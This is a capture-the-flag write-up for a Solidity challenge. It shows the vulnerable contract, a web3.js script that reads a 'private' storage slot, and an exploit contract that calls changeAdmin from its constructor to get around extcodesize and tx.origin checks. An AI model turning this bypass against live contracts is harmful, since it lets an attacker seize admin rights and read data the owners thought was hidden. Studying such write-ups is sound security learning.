# Access Denied

## Challenge

We get contract: 

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract access_denied {
    string private data; 
    address admin;

    constructor(string memory _data) {
        data = _data;
        admin = msg.sender;
    }

    function isContract(address addr) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    modifier noEOA {
        require (msg.sender != tx.origin, "No-EOA allowed!");
        _;
    }

    modifier noContract {
        require (!isContract(msg.sender), "No-contract allowed either!");
        _;
    }

    function changeAdmin(address _addr) external noEOA noContract {
        _changeAdmin(_addr);
    }

    function _changeAdmin(address _addr) private {
        require(msg.sender==_addr);
        admin = _addr ;

    }
    
    function getflag() public view returns (string memory) {
        require(msg.sender == admin, "You are not admin yet!");
        return(data);
    }
}
```

Our goal is to retrieve the flag.

## Solution

There are 2 ways to solve this challenge:

1. The easy way (probably not intended)

You can just read out the private flag variable using web3.js

```
// Description:
// A short script that lets you read out the storage of a smart contract

// How to use:
// 1. Change the RPC URL to the one of the network you're using
// 2. Replace the first parameter of getStorageAt with the address of the contract you're targeting
// 3. Change the second parameter to the storage slot you want to read out.

// Import the web3.js library
const Web3 = require('web3');

// Set up the web3 provider using the RPC URL and chain ID of the custom blockchain
const web3 = new Web3(new Web3.providers.HttpProvider('https://rpc2.sepolia.org	'));

// Get the storage value at a specific address and position
async function getStorageAt(address, position) {
  try {
    const storageValue = await web3.eth.getStorageAt(address, position);
    console.log(`Storage value at address ${address} and position ${position}: ${storageValue}`);
  } catch (error) {
    console.error(error);
  }
}

// Call the getStorageAt function with a specific address and position
getStorageAt('0x65E7Fe0c5112ae242732786eEd8dCc31e27131d7', 0);
```

running this yields us the flag "flag{7h3_Prof3ss0r}"

2. The "hard way"

The contract checks if we are a contract and if we have a codesize of 0. We can just circumvent this by doing everythign in the constructor. I also set the flag to private so other people can't directly call my contract and get a flag.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Chal.sol";

contract exploit {
    address owner;
    string private flag;

    constructor(address target)
    {
        owner = msg.sender;
        access_denied(target).changeAdmin(address(this));
        flag = access_denied(target).getflag();
    }


    function getFlag() public view returns(string memory)
    {
        require (msg.sender == owner);
        return flag;
    }
}
```

Then i just ran this with the address and got the flag.

